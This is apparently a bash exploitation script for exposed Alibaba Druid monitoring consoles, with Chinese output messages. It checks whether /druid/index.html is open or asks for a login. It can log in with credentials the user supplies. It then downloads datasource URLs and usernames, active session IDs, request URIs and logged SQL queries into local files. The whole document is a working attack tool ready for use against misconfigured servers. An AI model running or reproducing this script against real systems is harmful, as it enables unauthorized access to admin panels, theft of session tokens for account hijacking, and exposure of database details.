#!/bin/bash
# author: yuyan-sec

url=$1
url=${url%"/"}
user=$2
pass=$3
s="获取内容成功, 具体查看目录下的文件"

if [[ -z $url ]]
then
    echo "缺少参数:  bash druid.sh URL USERNAME PASSWORD"
    exit 8
fi

code=`curl -k -I -m 10 -o /dev/null -s -w %{http_code} $url/druid/index.html`

if (($code == "302"))
then
    echo "druid 需要登录: bash druid.sh URL USERNAME PASSWORD"

    if [[ $user ]] && [[ $pass ]]
    then
        echo "正在尝试登录, 用户名: $user  密码: $pass"
        err=`curl -k -d "loginUsername=$user&loginPassword=$pass" $url/druid/submitLogin -c cookie.txt`
        if [[ $err == "success" ]]
        then
            curl -k -b cookie.txt $url/druid/datasource.json | jq '.Content[]' | jq '.URL, .UserName'
            curl -k -b cookie.txt $url/druid/websession.json | jq '.Content[]' | jq '.SESSIONID' | sed 's/\"//g' > sessions.txt
            curl -k -b cookie.txt $url/druid/weburi.json | jq '.Content[]' | jq '.URI' | sed 's/\"//g' > urls.txt
            curl -k -b cookie.txt $url/druid/sql.json | jq '.Content[]' | jq '.SQL' | sed 's/\"//g' > sql.txt
            echo $s
        elif [[ $err = "error" ]]
        then
            echo "用户名或密码错误"
        else
            echo "未知错误: $err"
        fi
    fi
elif (($code == "200" ))
then
    curl -k $url/druid/datasource.json | jq '.Content[]' | jq '.URL, .UserName'
    curl -k $url/druid/websession.json | jq '.Content[]' | jq '.SESSIONID' | sed 's/\"//g' > sessions.txt
    curl -k $url/druid/weburi.json | jq '.Content[]' | jq '.URI' | sed 's/\"//g' > urls.txt
    curl -k $url/druid/sql.json | jq '.Content[]' | jq '.SQL' | sed 's/\"//g' > sql.txt
    echo $s
else
    echo "状态码: $code"
fi
